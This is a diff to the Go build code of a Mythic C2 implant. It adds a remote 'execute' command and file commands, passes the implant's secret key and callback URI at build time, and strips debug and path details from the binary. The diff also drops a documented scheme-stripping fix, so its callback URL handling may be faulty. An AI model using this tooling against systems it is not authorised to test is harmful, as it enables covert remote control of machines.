@@ -13,7 +13,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 )
@@ -56,15 +55,13 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 	}
 
 	// The callback host/port come from the C2 profile parameters.
-	// Strip the scheme from callback_host: Mythic returns "https://host", the implant
-	// reconstructs the full URL — storing the scheme twice produces an invalid URL (BUG-02).
+	// Preserve the full scheme (http:// or https://) so the implant can use either.
 	var callbackHost string
 	if len(input.C2Profiles) > 0 {
 		c2 := input.C2Profiles[0]
 		host, _ := c2.GetArg("callback_host")
 		port, _ := c2.GetArg("callback_port")
-		hostStr := strings.TrimPrefix(fmt.Sprintf("%v", host), "https://")
-		hostStr = strings.TrimPrefix(hostStr, "http://")
+		hostStr := fmt.Sprintf("%v", host)
 		callbackHost = fmt.Sprintf("%s:%v", hostStr, port)
 	}
 
@@ -124,6 +121,7 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 		"--target", target,
 		"--quiet",
 	}
+	rustflags := "--remap-path-prefix=" + crateDir + "=. -C debuginfo=0"
 	cmd := exec.Command("cargo", args...)
 	cmd.Dir = crateDir
 	cmd.Env = append(os.Environ(),
@@ -131,6 +129,7 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 		fmt.Sprintf("IMPLANT_SECRET=%s", aesKeyB64),
 		fmt.Sprintf("PAYLOAD_UUID=%s", payloadUUID),
 		fmt.Sprintf("CALLBACK_URI=%s", callbackURI),
+		fmt.Sprintf("RUSTFLAGS=%s", rustflags),
 	)
 
 	out, err := cmd.CombinedOutput()
@@ -227,4 +226,9 @@ func RegisterAllCommands() {
 	registerInject()
 	registerIntegrity()
 	registerExit()
+	registerCp()
+	registerMv()
+	registerRm()
+	registerMkdir()
+	registerExecute()
 }
